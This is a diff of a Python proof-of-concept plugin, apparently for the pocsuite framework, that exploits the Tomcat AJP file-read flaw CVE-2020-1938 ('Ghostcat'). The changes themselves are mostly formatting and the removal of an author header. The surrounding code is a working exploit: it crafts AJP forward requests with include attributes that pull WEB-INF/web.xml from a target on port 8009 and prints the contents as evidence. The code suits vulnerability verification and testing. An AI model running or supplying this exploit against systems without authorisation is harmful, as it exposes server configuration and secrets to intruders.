@@ -1,8 +1,4 @@
-# -*- coding: utf-8 -*-
-# Author:V1ZkRA
-# Time:2021/4/16
-
-# !/usr/bin/env python
+#!/usr/bin/env python
 # CNVD-2020-10487/CVE-2020-1938
 # Tomcat-Ajp lfi
 # https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
@@ -265,7 +261,6 @@ class AjpResponse(object):
         r.parse(stream)
         return r
 
-
 def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
     fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
     fr.method = method
@@ -292,7 +287,7 @@ def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.G
 
 
 class Tomcat(object):
-    def __init__(self, target_host, target_port, timeout=5):
+    def __init__(self, target_host, target_port, timeout = 5):
         self.target_host = target_host
         self.target_port = target_port
 
@@ -304,13 +299,13 @@ class Tomcat(object):
             self.stream = self.socket.makefile("rb", buffering=0)
         except socket.timeout:
             self.socket.close()
-            # print('[-] {}:{} => timeout'.format(self.target_host, self.target_port))
+            #print('[-] {}:{} => timeout'.format(self.target_host, self.target_port))
 
     def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
         self.req_uri = req_uri
         self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,
                                                            method=AjpForwardRequest.REQUEST_METHODS.get(method))
-        # print("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
+        #print("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
         if user is not None and password is not None:
             self.forward_request.request_headers[
                 'SC_REQ_AUTHORIZATION'] = f'Basic {base64.b64encode(f"{user}:{password}".encode()).decode()}'
@@ -326,11 +321,10 @@ class Tomcat(object):
             data_res = responses[1:-1]
             if len(data_res) == 0:
                 pass
-                # print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
+                #print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
             return snd_hdrs_res, data_res
         except:
-            return None, None
-
+            return None,None
 
 class TestPOC(POCBase):
     vulID = ''
@@ -366,7 +360,7 @@ class TestPOC(POCBase):
         else:
             ports = [8009]
         s = socket.socket()
-
+        
         for port in ports:
             try:
                 t = Tomcat(pr.hostname, port)
@@ -375,7 +369,7 @@ class TestPOC(POCBase):
                     {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', 'WEB-INF/web.xml']},
                     {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
                 ])
-                if data:
+                if data :
                     res_txt = ''.join([d.data.decode('utf_8') for d in data])
                     if 'web-app' in res_txt:
                         result['VerifyInfo'] = {}
@@ -384,7 +378,7 @@ class TestPOC(POCBase):
                         result['extra']['evidence'] = res_txt
                         break
             except:
-                # raise
+                #raise
                 pass
             finally:
                 s.close()
@@ -400,7 +394,6 @@ class TestPOC(POCBase):
         else:
             output.fail("not vulnerability")
         return output
-
 
 register_poc(TestPOC)
 
